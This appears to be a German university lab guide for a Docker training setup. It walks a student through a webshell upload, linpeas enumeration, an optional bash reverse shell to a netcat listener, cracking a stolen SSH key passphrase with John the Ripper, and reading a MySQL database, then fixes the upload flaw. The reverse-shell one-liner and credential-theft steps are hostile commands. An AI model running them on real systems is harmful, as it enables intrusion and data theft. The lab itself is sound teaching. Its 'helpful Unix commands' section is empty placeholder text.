# √úbungsanleitung

## **Password-Cracking & SQL-Injection**

### Allgemeines

- **Password-Cracking**
    
    Beim Password-Cracking unterscheidet man grunds√§tzlich zwischen Online und Offline Angriffen.
    - Online-Angriffe sind aufgrund Timeouts der Anfragen nicht so effizient wie ein Offline-Brute-Force Angriff.
    Hierbei versucht man bspw. durch eine Vielzahl an Anfragen das Passwort f√ºr einen **bekannten** Usernamen das Passwort zu erraten. Als Input verwendet man den bekannten User und eine Liste (Textdatei) mit g√§ngigen Passw√∂rtern, die durchgetestet werden k√∂nnen.
    - Bei Offline Brute-Force Angriffen sind meistens bereits Passw√∂rter **in gehashter Form** vorhanden (Bereits erfolgreicher Angriff auf Datenbank, wo Usernamen und gehashte Passw√∂rter abgegriffen werden konnten).
    Hierbei werden Timeouts vermieden, da der Rechner lokal Passw√∂rter mit der gegebenen Hash-Variante durchtestet, bis die Hashes identisch sind.
    
- **SQL-Injection**
    
    - Verwendet ein Webserver f√ºr Anfragen auf die Datenbank (bspw. Login) unsichere SQL-Queries, k√∂nnen mit schlauen Eingabestrings die SQL-Queries so manipuliert werden, dass man einen Bypass erzeugt und vort√§uscht, sich erfolgreich eingeloggt zu haben. Hierf√ºr gibt es ebenfalls Tools, um Webformulare auf m√∂gliche SQL-Injections zu testen.
    

## Komponenten

- ## Angreifer
    
  - **Kali Linux**
    
    Eine auf Debian basierte Linux Distribution. Kali Linux stellt Programme f√ºr Penetrationstest zur Verf√ºgung. Die auf dieser Distribution installierten Programme unterst√ºtzen den/die Angreifer/-in, in dieser √úbung bei dem Webshell-Angriff.
    
    - **Netcat**
        
        Netcat, kurz nc, ist ein universelles Kommandozeilenwerkzeug. Es kann im Terminal oder in Skripten f√ºr die Kommunikation √ºber TCP- und UDP-Netzwerkverbindungen (IPv4 und 6), aber auch lokale UNIX Domain Sockets genutzt werden.
        
    - **John The Ripper**
        
        Ist eine Software um Passw√∂rter zu entschl√ºsseln.
        
        ssh2john.py [**Schl√ºssedatei**] > [**Zieldatei**] wird in dieser √úbung genutzt um die Passphrase f√ºr einen privaten Schl√ºssel herauszufinden.
        
    - **Wordlist**
        
        Zu dt. Passw√∂rterliste ist eine Liste an W√∂rtern, die meist in Verbindung mit dem W√∂rterbuchangriff genutzt werden, um Passw√∂rter zu knacken. Die hier verwendete W√∂rterliste ist rockyou.txt.
        

- ## Angriffsziele

  - **Ubuntu Rechner**
    
    Einfaches Ziel f√ºr den ersten Abschnitt des Versuchs, um sich mit Brute-Force vertraut zu machen. 
    Besitzt mehrere User f√ºr eine ssh-Verbindung, welche mittels Online-Cracking geknackt wird.    
        
  - **Webapplikation**
    
    Eine einfache Webseite mit Login-Formular und anschlie√üender SQL-Abfragem√∂glichkeit. Hier wird SQL-Injection simuliert, um Userdaten (gehashte Passw√∂rter) abzugreifen und anschlie√üen offline zu knacken.
    
  - **Datenbank**
    
    Eine MySQL-Datenbank. Enth√§lt Userdaten der Webseite.
    

### Hilfreiche Unix Befehle

??????????


# Start

Starten sie die Virualisierungsumgebung indem sich mit dem Befehl
```
sudo docker-compose up -d --build
```
die docker-compose.yaml ausf√ºhren. Dadurch werden die oben genannten Komponenten hochgefahren.


## 1. Part: Online Passwort-Cracking

1. **Schritt:** üòà **(Perspektive: Angreifer/-in)**
    
    Loggen Sie sich in den w3af Container und f√ºhren Sie das Skript **w3af_console** aus, indem Sie folgenden Befehl 
    
    ```bash
    ./w3af_console
    ```
    
    im Terminal ausf√ºhren. 
    
    Mit dem Befehl 
    
    ```bash
    help [Option]
    ```
    
    werden Ihnen die verschiedenen Befehle und deren Beschreibung von w3af angezeigt. Die drei Befehle, die Sie in dieser √úbung verwenden werden sind **Plug-Ins**, **target** und **start**.
    
    Geben Sie **Plug-Ins** in das Terminal ein, Sie sollten nun in der Plug-Ins Oberfl√§che sein. Mit einer weiteren Eingabe von **help** werden Ihnen die verschieden Scanmodule angezeigt. Aktivieren Sie die Module **web_spider** und **file_upload**, in dem Sie die Befehle 
    
    ```bash
    crawl web_spider
    ```
    
    und 
    
    ```bash
    grep file_upload
    ```
    
    nacheinander ausf√ºhren.
    
    Mit **back** gelangen Sie wieder in die vorherige Oberfl√§che.
    
    Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als Ihr Ziel. 
    
    Daf√ºr m√ºssen Sie den Befehl **target** eingeben, gefolgt von dem Befehl
    
    ```bash
    set target http://<local_ip_adresse>:8080
    ```
    
    Mit der Eingabe von **view** lassen sich die Ziele einsehen.
    
    Kehren Sie wieder in die urspr√ºngliche Oberfl√§che zur√ºck (**back**) und starten Sie den Scan √ºber den Befehl **start.**
    
    Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen: 
    
    - Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;
    - Welche URLs existieren f√ºr die Ziel Webanwendung und wo werden eventuell von dem/der Benutzer/-in hochgeladene Dateien abgespeichert
    
    beantworten.
    
2. **Schritt:** üòà **(Perspektive: Angreifer/-in)**
    
    Laden Sie die Webshell (webshell.php) √ºber die Upload Funktion der Webseite auf den Webserver und √∂ffnen Sie das Skript √ºber den Browser, indem Sie in der Suchleiste die URL 
    
    ```
    [localhost:8080](http://localhost:8080)/[storage_path]/[file_name] 
    ```
    
    eingeben. Das Passwort um f√ºr die Autorisierung der Webshell ist: "**j~82BQC\;3N<`HK~**".
    
    Sammeln Sie Informationen √ºber den Server, indem Sie die oben genannten **Unix Befehle** verwenden um sich durch das Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im Abschnitt **Server Seite,** unter **Allgemeines / Angriff,** des Dateisystems oben beschrieben.
    
    Um die Informationssuche zu automatisieren k√∂nnen Sie das Skript **linpeas.sh** hochladen und ausf√ºhren. Sie k√∂nnen das Skript auch √ºber die Webseite hochladen oder die Upload-Funktion der Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden zum ausf√ºhren des Skriptes.
    
    ```bash
    bash ./linpeas.sh
    ```

    ````bash  
    üí° Optional - Reverse Shell: 
    Loggen Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname -i ausgeben. 
    Anschlie√üend k√∂nnen Sie den Befehl nc -lnvp [port] ausf√ºhren. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. 
    Sende Senden Sie den Befehl 
   
    bash -c "bash -i >& /dev/tcp/[client_ip]/[port] 0>&1"
   
    √ºber die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und √ºbergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal. Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden 
    sein. Nun k√∂nnen Sie statt im Browser √ºber eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausf√ºhrung auf der Reverse Shell 
    koloriert bzw. formatiert angezeigt.
    ````
    
    linpeas.sh gibt Ihnen interessante Informationen, wie Systeminformationen, gefundene Dateien von Relevanz und andere n√ºtzliche Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in einem Terminal ausgeben lassen). 
    
    Suchen Sie in der Ausgabe nach Authentifizierungsinformation f√ºr die Datenbank und Schl√ºssel f√ºr eine SSH Verbindung.
    
    Lokalisieren Sie das SSH Verzeichnis, des Eigent√ºmers der Schl√ºssel und √ºberpr√ºfen Sie die Rechte der Dateien. Kopieren Sie sich den privaten Schl√ºssel
    
    √ñffnen Sie im Kali Linux Container ein Terminal um eine SSH Verbindung zum Webserver herzustellen. 
    
    ```bash
    ssh <username>@<webserver_ip_adress>
    ```
    
    Die SSH Verbindung scheint passwortgesch√ºtzt zu sein. 
    
3. **Schritt:** üòà **(Perspektive: Angreifer/-in)**
    
    In diesem Schritt werden Sie das Passwort des privaten Schl√ºssels knacken.
    
    Erstellen Sie daf√ºr eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali Linux Container und f√ºgen Sie den vom Webserver kopierten Schl√ºssel in die erstellte Datei ein. Navigieren Sie hierf√ºr in das Homeverzeichnis.
    
    ```bash
    cd /home && nano <ssh_username>.id_rsa
    ```
    
    Das Programm John The Ripper kann die Schl√ºsseldatei nicht direkt verarbeiten. Deshalb muss der Schl√ºssel zuerst in einen Hash umgewandelt werden, den John The Ripper interpretieren kann.
    
    Nutzen Sie daf√ºr ssh2john.py. Mit dem Befehl 
    
    ```bash
    python ssh2john.py [<ssh_username>.id_rsa] > [<ssh_username>.hash] 
    ```
    
    wird eine Datei, welche einen kryptografisch verschl√ºsselten Schl√ºssel enth√§lt, in einen Hash umgewandelt und in die zweite Datei geschrieben.
    
    ```bash
     john --wordlist=/usr/share/wordlists/rockyou.txt [hash_file]
    ```
    
    Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut sich √ºber SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung sehen Sie das Terminal des Webservers.
    
4. **Schritt:** üòà **(Perspektive: Angreifer/-in)**
    
    In letzten Schritt der Angreifer/-innen Perspektive werden Sie versuchen Daten aus der Datenbank zu lesen.
    
    Verbinden Sie sich mit der Datenbank, indem Sie die Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl einf√ºgen und ausf√ºhren. 
    
    ```bash
    mysql -u [username] -p -h [host_name] [database_name]
    ```
    
    Geben Sie das Passwort bei der Aufforderung ein und best√§tigen Sie dies mit der Enter-Taste.
    
    N√ºtzliche SQL-Befehle: 
    
    ```sql
    SHOW TABLES;
    SELECT * FROM [database_name].[table_name];
    
    // Die Funktionen ST_X(position) und ST_Y(position) ... wandelt das Attribut  
    // "position" in latitude und longitude (Koordinaten) um
    // z.B. SELECT ST_X(position), ST_Y(position) FROM [table_name]
    
    // Weitere Abfragen finden Sie in den Dateien, in dem die 
    // Authentifizierungsinformation gefunden wurden.
    ```
    
    Mit **exit** verlassen Sie die MySQL Oberfl√§che wieder.
    

### Behebung der Sicherheitsl√ºcke

üõ†Ô∏è **(Perspektive: Serveradministrator/-in)**

Im finalen Schritt dieser √úbung wechseln Sie in die Rolle eines/r Serveradministrator/-in.

Wichtig ist es, dass die hier gezeigten Ma√ünahmen unvollst√§ndig sind um einen ausreichenden Schutz gegen√ºber dieser Sicherheitsl√ºcke zu gew√§hren. Die Ma√ünahmen sind jedoch ausreichend f√ºr den Anwendungsfall dieser √úbung. 

1. **Ma√ünahme** 
    
    Erstellen Sie eine .htaccess Datei mit unten angef√ºhrtem Inhalt
    
    ```bash
    nano /var/www/html/public/uploads/images/.htaccess
    ```
    
    Inhalt der .htaccess Datei:
    
    ```
    RemoveHandler .php .phtml .php3
    RemoveType .php .phtml .php3
    php_flag engine off
    ```
    
    Die htaccess Datei ist eine Konfigurationsdatei f√ºr einen Apache Server. Sie enth√§lt Konfigurationen und Regeln bez√ºglich des Verzeichnisses. Die htaccess Datei wird bei jeder Anfrage an den Server ausgewertet und angewandt.
    
    Probieren Sie die Webshell noch einmal √ºber den Browser aufzurufen.
    
    Der Inhalt der Datei verhindert das Ausf√ºhren von .ph* (PHP) Dateien in dem Verzeichnis.  
    
2. **Ma√ünahme**
    
    Eine unkontrollierte Dateiupload Funktion kann wie Sie in den vorherigen Schritten gesehen haben, unkontrollierte Auswirkungen haben. Deshalb werden Sie in diesem Schritt eine Dateiupload Validierung einf√ºgen.
    
    Lokalisieren Sie hierf√ºr die Datei **upload.php** im Verzeichnis **/var/www/html/php.** 
    
    Bearbeiten Sie diese Datei mit **nano.**
    
    Lokalisieren Sie die Zeilen: 
    
    ```php
    uploadUnSanitized($fileStorage, $fileName, $tmpFileName);
    // uploadSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    Kommentieren Sie die Funktion 
    
    ```php
    uploadUnSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    aus und die Funktion 
    
    ```php
    uploadSanitized($fileStorage, $fileName, $tmpFileName);
    ```
    
    ein (**"//"** vor der Funktion entfernen/setzten).
    
    In der uploadSanitized()-Funktion wird der mimeType (Dateityp z.B. image/jpeg), welcher √ºber die HTTP-Anfrage gesetzt wird, gepr√ºft und validiert. Bei erfolgreicher Validierung (Dateityp ist ein Bildformat) wird der Dateiname und Dateiendung neu gesetzt und anschlie√üend wird die Datei abgespeichert. 
    
    Der Webserver antwortet mit einem **HTTP 200 OK** beim erfolgreichen hochladen einer validen Datei und ein **HTTP 400 Bad Request** beim Hochladen einer nicht validen Bilddatei.
    
    L√∂schen Sie nun die von Ihnen hochgeladene Webshell und linpeas.sh Skript. 
    
    Die Sicherheitsl√ºcke ist f√ºr den Anwendungsfall dieser √úbung gestoppt. 
    

### **Erneuter Angriffsversuch**

üòà **(Perspektive: Angreifer/-in)**

Probieren Sie die Webshell noch einmal √ºber den Browser hochzuladen.

Der Webserver sollte Ihnen das hochladen einer nicht validen Datei verwehren.

**Sie haben nun das Ende der √úbung erreicht.** üéä

:exclamation:

